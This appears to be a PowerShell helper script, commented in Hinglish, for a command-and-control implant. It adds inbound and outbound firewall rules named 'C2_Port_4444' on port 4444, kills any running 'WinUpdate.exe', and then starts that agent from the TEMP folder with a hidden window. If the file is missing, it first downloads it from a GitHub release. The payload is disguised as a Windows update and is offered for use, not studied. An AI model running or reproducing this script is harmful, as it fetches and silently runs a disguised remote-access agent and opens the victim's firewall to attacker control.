# ======================================================
# PORT HELPER - Firewall Rule Add + Agent Connect
# ======================================================

# 1. Windows Defender Firewall mein port 4444 allow karo
Write-Host "[*] Adding firewall rule for port 4444..."
netsh advfirewall firewall add rule name="C2_Port_4444" dir=in action=allow protocol=TCP localport=4444
netsh advfirewall firewall add rule name="C2_Port_4444_Out" dir=out action=allow protocol=TCP localport=4444

# 2. Public profile mein bhi allow karo
netsh advfirewall set currentprofile settings inboundusernotification enable
netsh advfirewall set allprofiles state on

Write-Host "[+] Firewall rule added successfully!"

# 3. Agent ko restart karo (agar chal raha hai toh)
taskkill /f /im WinUpdate.exe 2>$null
Start-Sleep -Seconds 2

# 4. Agent start karo
$agentPath = "$env:TEMP\WinUpdate.exe"
if (Test-Path $agentPath) {
    Write-Host "[*] Starting agent..."
    Start-Process -FilePath $agentPath -WindowStyle Hidden
    Write-Host "[+] Agent started!"
} else {
    Write-Host "[-] Agent not found! Downloading..."
    Invoke-WebRequest -Uri "https://github.com/Abdullahkhan1212/WinUpdate-Project/releases/download/WinUpdate-v1.2/WinUpdate.exe" -OutFile $agentPath
    Start-Process -FilePath $agentPath -WindowStyle Hidden
    Write-Host "[+] Agent downloaded and started!"
}